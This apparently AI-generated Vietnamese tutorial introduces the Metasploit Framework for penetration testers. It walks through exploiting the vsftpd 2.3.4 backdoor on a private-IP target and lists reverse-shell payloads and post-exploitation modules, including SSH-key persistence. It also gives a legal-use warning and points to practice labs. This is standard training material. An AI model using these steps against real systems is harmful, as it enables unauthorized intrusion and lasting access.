Dưới đây là nội dung chi tiết cho bài học:

---

# 04. Metasploit

**Khung khai thác lỗ hổng mạnh mẽ nhất dành cho pentester**

---

## 🎯 Mục tiêu

* Hiểu khái niệm và kiến trúc của Metasploit.
* Biết cách sử dụng các module chính: exploit, payload, auxiliary...
* Thực hành khai thác một lỗ hổng đơn giản với Metasploit Framework.

---

## 📌 1. Metasploit là gì?

Metasploit là một **framework** hỗ trợ kiểm thử bảo mật, khai thác lỗ hổng, và phát triển mã khai thác (exploit).

### 🔑 Thành phần chính:

* **Exploit**: đoạn mã khai thác lỗ hổng
* **Payload**: mã thực thi sau khi exploit thành công (VD: mở shell)
* **Auxiliary**: các module hỗ trợ (scan, fuzzing, brute force...)
* **Post**: module thực hiện hành vi sau khai thác (VD: lấy mật khẩu, tạo backdoor...)

---

## 🛠 2. Cài đặt và khởi động

### ✅ Trên Kali Linux:

Metasploit đã được cài sẵn. Khởi chạy bằng:

```bash
msfconsole
```

---

## ⚙️ 3. Câu lệnh cơ bản

| Lệnh                   | Mô tả                                     |
| ---------------------- | ----------------------------------------- |
| `search tên_lo_hong`   | Tìm kiếm exploit theo tên/lỗ hổng         |
| `use đường_dẫn_module` | Sử dụng module (exploit, auxiliary, etc.) |
| `set`                  | Gán giá trị (IP, payload, port...)        |
| `show options`         | Xem các tham số cần thiết                 |
| `exploit` hoặc `run`   | Thực thi tấn công                         |

---

## 🚀 4. Thực hành khai thác đơn giản

**Kịch bản**: Máy mục tiêu đang chạy dịch vụ vulnerable FTP (`vsftpd 2.3.4`).

### 🔹 Bước 1: Tìm module exploit

```bash
search vsftpd
```

Chọn module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 🔹 Bước 2: Cấu hình tham số

```bash
set RHOSTS 192.168.1.100
set RPORT 21
```

### 🔹 Bước 3: Tấn công

```bash
exploit
```

Nếu thành công, bạn sẽ có shell truy cập hệ thống đích.

---

## 📦 5. Payload phổ biến

| Payload                             | Mô tả                          |
| ----------------------------------- | ------------------------------ |
| `cmd/unix/reverse`                  | Lệnh đảo chiều shell trên Unix |
| `windows/meterpreter/reverse_tcp`   | Shell mạnh trên Windows        |
| `linux/x86/meterpreter/reverse_tcp` | Tương tự cho Linux             |

---

## 🧪 6. Post-exploitation

Sau khi truy cập thành công hệ thống:

```bash
run post/linux/gather/enum_users
```

Hoặc:

```bash
run post/multi/manage/sshkey_persistence
```

---

## 📌 7. Giao diện web: Metasploit Community / Armitage

* Armitage: giao diện GUI hỗ trợ tấn công nhóm và mô phỏng tập trung.
* Có thể cài thêm nếu muốn tấn công trực quan.

---

## 🛡 8. Lưu ý an toàn

* Metasploit rất mạnh → **Chỉ dùng trong môi trường kiểm thử hợp pháp**.
* Sử dụng nhầm có thể phá vỡ hệ thống thật và vi phạm pháp luật.

---

## 🧠 Tổng kết

* Metasploit là công cụ quan trọng trong quy trình khai thác lỗ hổng.
* Bạn cần kết hợp Nmap + Recon + Metasploit để tạo ra các đòn tấn công hiệu quả.
* Nên luyện tập trên các môi trường như: **Metasploitable**, **TryHackMe**, **Hack The Box**, **DVWA**...

---

Bạn muốn tiếp tục với bài **05. Meterpreter nâng cao** không?
